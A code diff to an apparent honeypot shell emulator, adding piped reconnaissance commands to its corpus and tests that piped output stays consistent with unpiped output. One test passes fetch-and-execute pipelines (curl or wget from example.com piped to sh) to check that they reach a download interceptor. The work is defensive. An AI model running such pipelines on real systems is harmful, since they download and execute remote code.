@@ -78,6 +78,14 @@ RECON_CORPUS: tuple[tuple[str, str], ...] = (
     ("time", "date"),
     ("which", "which python3"),
     ("which", "which curl"),
+    # Piped recon. These are the forms that used to fall through to the
+    # LLM despite the emulator answering their unpiped counterparts — two
+    # of them are FINGERPRINT_PROBE's repeat probes.
+    ("pipe", "free -m | head -2"),
+    ("pipe", "cat /etc/os-release | head -3"),
+    ("pipe", "cat /proc/cpuinfo | grep -m1 'model name'"),
+    ("pipe", "ps aux | grep root"),
+    ("pipe", "ls -la /tmp | wc -l"),
 )
 
 # A subset that's universally present on a stock Linux box and safe/quick to
@@ -302,6 +310,52 @@ def run_consistency(ctx: respondermod.ShellContext) -> list[CheckResult]:
     check(
         "loadavg stable across calls",
         _out(ctx, "cat /proc/loadavg") == _out(ctx, "cat /proc/loadavg"),
+    )
+
+    # --- pipelines -----------------------------------------------------
+    # A piped command must agree with the unpiped one it filters. If these
+    # ever disagree, the pipeline path has started inventing output rather
+    # than filtering it, which is exactly the failure the deterministic
+    # responder exists to prevent.
+    free_full = _out(ctx, "free -m") or ""
+    free_head = _out(ctx, "free -m | head -2") or ""
+    check(
+        "free -m | head -2 is a prefix of free -m",
+        free_head and free_full.startswith(free_head),
+        f"{free_head!r}",
+    )
+
+    osr_full = _out(ctx, "cat /etc/os-release") or ""
+    osr_head = _out(ctx, "cat /etc/os-release | head -3") or ""
+    check(
+        "os-release | head -3 equals the first 3 lines",
+        osr_head == "\n".join(osr_full.splitlines()[:3]) + "\n",
+        f"{osr_head!r}",
+    )
+
+    # The one that would silently be wrong: real ls drops its column layout
+    # when stdout is not a tty, so a piped `ls` must report the entry count
+    # rather than 1.
+    etc_names = (_out(ctx, "ls /etc") or "").split()
+    etc_count = (_out(ctx, "ls /etc | wc -l") or "0").strip()
+    check(
+        "ls | wc -l counts entries, not lines of a column layout",
+        etc_names and etc_count == str(len(etc_names)),
+        f"{etc_count} vs {len(etc_names)}",
+    )
+
+    check(
+        "piped output is stable across identical calls",
+        _out(ctx, "ps aux | head -3") == _out(ctx, "ps aux | head -3"),
+    )
+
+    # Payload-fetch pipelines must never be answered locally: the download
+    # interceptor runs *after* the deterministic responder, so handling
+    # one here would silently lose the capture.
+    check(
+        "download pipelines defer to the interceptor",
+        _out(ctx, "curl http://example.com/x.sh | sh") is None
+        and _out(ctx, "wget -qO- http://example.com/x | sh") is None,
     )
 
     return results
